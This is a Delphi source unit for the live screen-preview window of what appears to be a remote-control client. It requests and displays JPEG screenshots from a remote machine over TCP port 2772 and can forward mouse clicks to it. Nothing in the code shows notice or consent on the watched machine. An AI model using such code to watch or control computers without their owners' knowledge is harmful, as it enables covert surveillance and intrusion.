unit nonstopUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, MainColors,
  ExtCtrls, StdCtrls, TFlatSpeedButtonUnit, Gauges, ScktComp,
  TFlatEditUnit, TFlatCheckBoxUnit, OutlookBtn, Jpeg, RXSpin;

type
  TnonstopForm = class(TForm)
    CaptionLabel: TLabel;
    CloseButton: TFlatSpeedButton;
    Image1: TImage;
    doitnow: TTimer;
    ClientSocket1: TClientSocket;
    pro: TGauge;
    lab: TLabel;
    Shape1: TShape;
    OutlookBtn2: TOutlookBtn;
    OutlookBtn3: TOutlookBtn;
    Label1: TLabel;
    MonitorClicks: TFlatCheckBox;
    RxSpinEdit: TRxSpinEdit;
    procedure FormCreate(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure CaptionLabelMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure OutlookBtn2Click(Sender: TObject);
    procedure RxSpinEditChange(Sender: TObject);
    procedure doitnowTimer(Sender: TObject);
    procedure ClientSocket1Connect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocket1Disconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure OutlookBtn3Click(Sender: TObject);
    procedure Image1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormPaint(Sender: TObject);
    procedure FormResize(Sender: TObject);
  private
    procedure WMNCHitText(var Msg:TWMNCHitTest);message WM_NCHITTEST;
  public
    MouseDownSpot : TPoint;
    Capturing : bool;
    procedure SetTheColors;
  end;

var
  nonstopForm: TnonstopForm;
  receiving:boolean;
  qual:string;

implementation

uses MainUnit;

{$R *.DFM}

function Merge(x,y,x1,y1,x2,y2:integer):Boolean;
begin
 if ((x>=x1) and (x<=x2)) and ((y>=y1) and (y<=y2)) then result:=true else result:=false;
end;
var KeepX,KeepY:Integer;
procedure TnonstopForm.WMNCHitText(var Msg:TWMNCHitTest);
const Corner=5;
      OffSet=3;
begin
  inherited;
 with nonstopForm,msg do begin
{  if (Merge(xpos,ypos ,Left+MinimizeButton.Left,Top+MinimizeButton.Top,Left+MinimizeButton.Left+MinimizeButton.Width,Top+MinimizeButton.Top+MinimizeButton.Height)) then exit;}
  if (Merge(xpos,ypos ,Left+CloseButton.Left,Top+CloseButton.Top,Left+CloseButton.Left+CloseButton.Width,Top+CloseButton.Top+CloseButton.Height)) then exit;
 end;
 if (Msg.Result = HTCLIENT) then
  with nonstopForm,msg do begin
  if (Merge(xpos,ypos ,Left         ,top+Corner        ,left+Offset       ,top+height-Corner)) then Result := htLeft;
  if (Merge(xpos,ypos ,Left+width-Offset ,top+Corner        ,left+width   ,top+height-Corner)) then Result := htRight;
  if (Merge(xpos,ypos ,Left+Corner       ,top          ,left+width-Corner ,top+Offset       )) then Result := htTop;
  if (Merge(xpos,ypos ,Left+Corner       ,top+height-Offset ,left+width-Corner ,top+height  )) then Result := htBottom;
  if (Merge(xpos,ypos ,Left,Top,Left+Corner,Top+Corner)) then Result:=htTopLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top,Left+Width,Top+Corner)) then Result:=htTopRight;
  if (Merge(xpos,ypos ,Left,Top+Height-Corner,Left+Corner,Top+Height)) then REsult:=htBottomLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top+Height-Corner,Left+Width,Top+Height)) then Result:=htBottomRight;
{  if (Merge(xpos,ypos ,Left+CaptionLabel.Left,Top+CaptionLabel.Top,Left+CaptionLabel.Left+CaptionLabel.Width,Top+CaptionLabel.Top+CaptionLabel.Height)) then Result:=htCaption;}
 end;
end;

procedure TnonstopForm.SetTheColors;
begin
 CaptionLabel.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 with CloseButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
  Glyph.Assign(MainForm.bit_close_btn);
  NumGlyphs:=2;
  Caption:='';
  Top:=5;
 end;
 pro.BackColor:=cFormBackground;pro.ForeColor:=cFormForeGround;
 pro.Font.Color:=cFormText;pro.Color:=cFormText;
 lab.Font.Color:=cFormText;Shape1.Pen.Color:=cFormText;
 label1.font.color:=cFormText;
 with RxSpinEdit do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 with MonitorClicks do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 Invalidate;
end;

procedure TnonstopForm.FormCreate(Sender: TObject);
begin
 Tag:=8;Left:=(Screen.Width-Width) div 2; Top:=(Screen.Height-Height) div 2;
 if MainForm.ReadKey(IntToStr(Tag)+'_x')<>'' then Left:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_x'));
 if MainForm.ReadKey(IntToStr(Tag)+'_y')<>'' then Top:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_y'));
 if MainForm.ReadKey(IntToStr(Tag)+'_h')<>'' then Height:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_h'));
 if MainForm.ReadKey(IntToStr(Tag)+'_w')<>'' then Width:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_w'));
 SetTheColors;
end;

procedure TnonstopForm.CloseButtonClick(Sender: TObject);
begin
{ checkbox1.checked:=false;}
 outlookbtn3.caption:='enable';
 ClientSocket1.Active:=False;
 MainForm.ClientSocket.Socket.SendText('CL2');
 hide;
end;

procedure TnonstopForm.CaptionLabelMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;


procedure TnonstopForm.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TnonstopForm.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TnonstopForm.OutlookBtn2Click(Sender: TObject);
begin
{ checkbox1.checked:=false;}
 outlookbtn3.caption:='enable';
 ClientSocket1.Active:=False;
 MainForm.ClientSocket.Socket.SendText('CL2');
 hide;
end;

procedure TnonstopForm.RxSpinEditChange(Sender: TObject);
begin
 doitnow.interval:=StrToInt(RxSpinEdit.Text)*1000;
end;

procedure TnonstopForm.doitnowTimer(Sender: TObject);
var x,y:string;
begin
 qual:=IntToStr(MainForm.TrackBar1.Value);
 if length(qual)=1 then qual:='00'+qual else
  if length(qual)=2 then qual:='0'+qual;
 x:=IntToStr(Image1.Width);
 y:=IntToStr(Image1.Height);
 if length(x)=1 then x:='000'+x
  else if length(x)=2 then x:='00'+x
   else if length(x)=3 then x:='0'+x;
 if length(y)=1 then y:='000'+y
  else if length(y)=2 then y:='00'+y
   else if length(y)=3 then y:='0'+y;
 ClientSocket1.socket.SendText('DOIT'+qual+x+y);
 doitnow.enabled:=false;
end;

procedure TnonstopForm.ClientSocket1Connect(Sender: TObject;
  Socket: TCustomWinSocket);
var x,y:string;
begin
 qual:=IntToStr(MainForm.TrackBar1.Value);
 if length(qual)=1 then qual:='00'+qual;
 if length(qual)=2 then qual:='0'+qual;
 if qual='' then qual:='040';
 if length(qual)=1 then qual:='00'+qual else
  if length(qual)=2 then qual:='0'+qual;
 x:=IntToStr(Image1.Width);
 y:=IntToStr(Image1.Height);
 if length(x)=1 then x:='000'+x
  else if length(x)=2 then x:='00'+x
   else if length(x)=3 then x:='0'+x;
 if length(y)=1 then y:='000'+y
  else if length(y)=2 then y:='00'+y
   else if length(y)=3 then y:='0'+y;
 try ClientSocket1.Socket.SendText('DOIT'+qual+x+y);except doitnow.enabled:=true;end;
 lab.visible:=false;
 pro.visible:=true;
end;

procedure TnonstopForm.ClientSocket1Disconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
outlookbtn3.caption:='enable';
lab.visible:=false;
pro.visible:=false;
end;

procedure TnonstopForm.ClientSocket1Read(Sender: TObject;
  Socket: TCustomWinSocket);
var Stream:TMemoryStream;
    nReceived,totalrecv,total,no,i: Integer;
    undesalveaza,StrIn,totalbytes:String;
    evreuna:boolean;
    jpg:TJpegImage;
begin
  lab.visible:=false;
  pro.visible:=true;
  if receiving then exit;
  UndeSalveaza:=MainForm.DownloadFolder;
  Socket.ReceiveBuf (Buffer, 5);
  strIn := Copy (Buffer, 1, 5);
  evreuna:=false;
  if copy(strin,1,3)='PRV' then evreuna:=true;
  if not evreuna then exit;
  receiving:=true;
  try no:=StrToInt(copy(strIN,4,2)); except end;
  totalbytes:='';
 try for i:=1 to no do
   begin
    Socket.ReceiveBuf (Buffer, 1);
    strIn := Copy (Buffer, 1, 1);
    totalbytes:=totalbytes+strIN;
   end;
   except
   end;
  total:=StrToInt(totalbytes);
 pro.maxvalue:=total;
 pro.minvalue:=0;
 pro.progress:=0;
 Stream := TMemoryStream.Create;
 totalrecv:=0;
{ showmessage('receiving...'+totalbytes);}
 try
  while (totalrecv<total) do begin
   Application.ProcessMessages;
   nReceived := Socket.ReceiveBuf (Buffer, sizeof (Buffer));
   if nReceived>0 then
   begin
    Stream.Write (Buffer, nReceived);
    totalrecv:=totalrecv+nreceived;
    pro.progress:=totalrecv;
   end;
  end;
  Stream.Position := 0;
  Stream.SaveToFile(undesalveaza+'preview2.jpg');
  jpg:=TJPEGImage.Create;
  Jpg.LoadFromStream(Stream);
  Image1.Picture.Bitmap.Assign(jpg);
  jpg.free;
 finally
  Stream.Free;
  receiving:=false;
 end;
 pro.progress:=0;
 qual:=IntToStr(MainForm.TrackBar1.Value);
 if length(qual)=1 then qual:='00'+qual;
 if length(qual)=2 then qual:='0'+qual;
 if qual='' then qual:='040';
 doitnow.enabled:=true;
end;

procedure TnonstopForm.OutlookBtn3Click(Sender: TObject);
begin
if outlookbtn3.caption='enable' then begin
 doitnow.interval:=StrToInt(rxspinedit.text)*1000;
 MainForm.ClientSocket.Socket.SendText('IN2');
 lab.visible:=true;
 pro.visible:=false;
 ClientSocket1.Port:=2772;
 ClientSocket1.Address:=MainForm.KeepConnectedIP;
 outlookbtn3.caption:='disable';
 try ClientSocket1.Active:=True;except lab.visible:=false;mainform.showmsg('error connecting for preview');outlookbtn3.caption:='enable';end;
 { sleep(2000);}
{ ClientSocket1.Socket.SendText('DOIT');}
end else begin
 ClientSocket1.Active:=False;
 MainForm.ClientSocket.Socket.SendText('CL2');
 outlookbtn3.caption:='enable';
end;

end;

function FalDe3(tt:string;l:integer):String;
var i:integer;
begin
Result:=tt;
if length(tt)=l then exit;
for i:=1 to l-length(tt) do
 tt:='0'+tt;
Result:=tt;
end;

procedure TnonstopForm.Image1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var but:string;
    xx,yy:integer;
begin
 if (not MonitorClicks.Checked) then exit;
 xx:=x;
 yy:=y;

 case Button of
  mbLeft:but:='1';
  mbRight:but:='3';
  mbMiddle:but:='2';
 end;
 MainForm.SendCommand('MBC'+FalDe3(IntToStr(xX),4)+FalDe3(IntToStr(yY),4)+FalDe3(IntToStr(Image1.Width),4)+FalDe3(IntToStr(Image1.Height),4)+but,'clicking mouse...','2.0');
end;

procedure TnonstopForm.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),MainForm.bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),MainForm.bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),MainForm.bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),MainForm.bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),MainForm.bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),MainForm.bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),MainForm.bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),MainForm.bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=MainForm.BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

procedure TnonstopForm.FormResize(Sender: TObject);
begin
 Invalidate;
end;

end.
